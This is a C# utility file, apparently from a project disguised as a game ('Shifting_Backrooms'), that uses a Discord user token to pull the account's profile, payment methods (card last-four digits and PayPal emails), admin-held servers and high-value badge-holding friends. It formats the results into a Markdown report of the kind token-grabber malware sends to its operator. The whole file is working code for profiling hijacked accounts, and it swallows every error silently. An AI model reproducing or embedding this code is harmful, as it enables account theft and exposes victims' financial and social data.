// C# | Utils/Identity.cs | C# 8.0 | .NET 4.8
// namespace aligned to Shifting_Backrooms.Utils

using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;

namespace Shifting_Backrooms.Utils
{
    public static class Identity
    {
        public static (string details, string avatarUrl) GetAccountDetails(string token)
        {
            try
            {
                using (var client = new WebClient())
                {
                    string clean = token.Trim().Replace("\"", "");
                    client.Headers.Add("Authorization", clean);
                    client.Headers.Add("User-Agent", "Mozilla/5.0");

                    string userJson = client.DownloadString("https://discord.com/api/v9/users/@me");
                    JObject user = JObject.Parse(userJson);

                    string username = user["username"].ToString();
                    string userId = user["id"].ToString();
                    string avatarHash = user["avatar"]?.ToString();
                    string avatarUrl = string.IsNullOrEmpty(avatarHash) ? "" :
                        "https://cdn.discordapp.com/avatars/" + userId + "/" + avatarHash + ".png";

                    string billingJson = client.DownloadString(
                        "https://discord.com/api/v9/users/@me/billing/payment-sources");
                    JArray billing = JArray.Parse(billingJson);
                    var methods = new List<string>();
                    foreach (var m in billing)
                    {
                        if ((int)m["type"] == 1) methods.Add("💳 CB (**** " + m["last_4"] + ")");
                        else if ((int)m["type"] == 2) methods.Add("🅿️ PayPal (" + m["email"] + ")");
                    }
                    string billingStr = methods.Count > 0 ? string.Join("\n", methods) : "❌ None";

                    string guildsJson = client.DownloadString(
                        "https://discord.com/api/v9/users/@me/guilds");
                    JArray guilds = JArray.Parse(guildsJson);
                    var powers = new List<string>();
                    foreach (var g in guilds)
                        if ((bool)g["owner"] || ((long)g["permissions"] & 0x8) == 0x8)
                            powers.Add("• " + g["name"]);
                    string powerStr = powers.Count > 0
                        ? string.Join("\n", powers.Take(4)) : "None";

                    int flags = int.Parse(user["public_flags"]?.ToString() ?? "0");
                    string nitro = user["premium_type"]?.ToString() == "2" ? "Boost 💎" : "No";

                    string res =
                        "👤 **User:** `" + username + "`\n" +
                        "🆔 **ID:** `" + userId + "`\n" +
                        "💎 **Nitro:** " + nitro + "\n" +
                        "💰 **Billing:**\n" + billingStr + "\n" +
                        "🏅 **Badges:** " + GetBadges(flags) + "\n" +
                        "🏰 **Admin of:**\n" + powerStr + "\n" +
                        "👥 **Top HQ Friends:**\n" + GetHQFriends(clean);

                    return (res, avatarUrl);
                }
            }
            catch { return (null, null); }
        }

        private static string GetHQFriends(string token)
        {
            try
            {
                using (var client = new WebClient())
                {
                    client.Headers.Add("Authorization", token);
                    string json = client.DownloadString(
                        "https://discord.com/api/v9/users/@me/relationships");
                    JArray friends = JArray.Parse(json);

                    var hqList = new List<(string Name, string Badges, int Score)>();
                    foreach (var friend in friends)
                    {
                        var u = friend["user"];
                        int f = (int)(u["public_flags"] ?? 0);
                        int score = 0;
                        if ((f & 1) != 0) score += 100;
                        if ((f & 2) != 0) score += 90;
                        if ((f & 131072) != 0) score += 50;
                        if ((f & 512) != 0) score += 40;
                        if ((f & 4) != 0) score += 10;
                        if (score > 0)
                            hqList.Add((u["username"].ToString(), GetBadges(f), score));
                    }

                    var top5 = hqList.OrderByDescending(x => x.Score).Take(5).ToList();
                    if (top5.Count == 0) return "No rare friends ❌";

                    string result = "";
                    foreach (var fr in top5)
                        result += "⭐ `" + fr.Name + "` (" + fr.Badges + ")\n";
                    return result;
                }
            }
            catch { return "Friend scan error"; }
        }

        private static string GetBadges(int flags)
        {
            var b = new List<string>();
            if ((flags & 1) != 0) b.Add("Staff");
            if ((flags & 2) != 0) b.Add("Partner");
            if ((flags & 4) != 0) b.Add("HypeSquad Events");
            if ((flags & 512) != 0) b.Add("Early Supporter");
            if ((flags & 131072) != 0) b.Add("Developer");
            return b.Count > 0 ? string.Join(", ", b) : "None";
        }
    }
}